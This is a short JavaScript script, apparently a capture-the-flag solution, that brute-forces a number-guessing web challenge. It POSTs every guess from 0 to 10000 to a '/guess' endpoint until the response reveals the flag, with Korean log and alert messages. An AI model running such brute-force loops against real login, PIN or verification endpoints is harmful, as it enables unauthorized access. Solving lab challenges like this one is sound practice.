async function bruteForce() {
    for (let guess = 0; guess <= 10000; guess++) {
        // console.log(`시도 중: ${guess}`);
        
        const formData = new FormData();
        formData.append('guess', guess.toString());
        
        try {
            const response = await fetch('/guess', {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            
            if (!result.flag.includes('Try')) {
                console.log(`Target Number: ${guess}`);
                console.log(`플래그: ${result.flag}`);
                alert(`정답: ${guess}, 플래그: ${result.flag}`);
                break;
            }
            
        } catch (error) {
            console.error(error);
        }
    }
}

bruteForce();